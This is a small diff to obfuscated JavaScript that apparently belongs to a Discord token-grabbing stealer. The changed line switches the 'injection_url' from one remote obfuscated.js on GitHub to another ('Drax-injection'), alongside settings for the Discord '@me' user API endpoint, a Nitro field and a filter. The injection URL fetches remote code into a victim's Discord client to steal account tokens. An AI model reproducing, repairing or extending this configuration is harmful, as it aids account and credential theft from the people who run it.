@@ -225,7 +225,7 @@ function _0xdce0c7(_0x586837, _0x358272, _0x42ffe5, _0x47152e, _0x1701d6) {
 }
 _0x4e235c.embed_icon = "https://cdn.discordapp.com/attachments/1194770414870724629/1194980055831547904/a_fe9b051610fb2ce00331d8d210867d61.gif?ex=65b252e6&is=659fdde6&hm=a62154b613ec58bfc820b7750591839c374d2a6e06c0fb3209375aeea32c1f5e&";
 _0x4e235c.embed_color = 0x0;
-_0x4e235c.injection_url = "https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js";
+_0x4e235c.injection_url = "https://raw.githubusercontent.com/Shadow132245/Drax-injection/main/master/obfuscated.js";
 _0x4e235c.api = "https://discord.com/api/v9/users/@me";
 _0x4e235c.nitro = _0x140165;
 _0x4e235c.filter = _0x3ca76f;
